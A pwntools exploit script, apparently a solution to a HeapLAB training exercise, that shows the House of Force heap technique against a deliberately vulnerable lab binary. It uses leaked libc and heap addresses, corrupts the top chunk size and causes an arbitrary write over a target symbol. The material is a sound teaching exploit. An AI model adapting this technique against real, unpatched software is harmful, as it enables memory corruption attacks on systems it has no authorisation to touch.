#!/usr/bin/python3
"""
Demonstrates arbitrary write on the heap using the House of Force technique.

Run with GDB and/or NOASLR options like so:
    `python soln.py [GDB, NOASLR]`
"""

from pwn import *

context.terminal = ["wezterm", "start", "--"]

elf = context.binary = ELF(b"house_of_force")
libc = ELF(elf.runpath + b"/libc.so.6")  # elf.libc broke again


def start():
    gs = """
    set solib-search-path /home/pwent/code/personal/Linux_ED/HeapLAB/HeapLAB/.glibc/glibc_2.28_no-tcache
    set sysroot /home/pwent/code/personal/Linux_ED/HeapLAB/HeapLAB/.glibc/
    continue
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Select the "malloc" option, send size & data.
def malloc(size, data):
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")


# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xFFFFFFFFFFFFFFFF - x) + y


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Our House of Force primitive to overwrite the top chunk's size field.
malloc(24, b"Y" * 24 + p64(0xFFFFFFFFFFFFFFFF))
pause()  # Type `vis` and/or `top-chunk` in pwndbg to confirm the top chunk size

# Calculate the distance wraparound to just before the `target` symbol in the
# application's .data section. Note the .data section is *before* the heap:
#
#   |Application|
#   |Heap       |
#   |Libraries  |
#   |Stack      |
#
distance = delta(heap + 0x20, elf.sym.target - 0x20)

# Trigger `malloc` so that the top chunk is now positioned just before the
# target symbol we want to overwrite.
malloc(distance, b"Y")

# The next allocation will overwrite the target symbol!
malloc(24, b"Much win")  # Use option `2` in the program confirm the overwrite!

# =============================================================================

io.interactive()
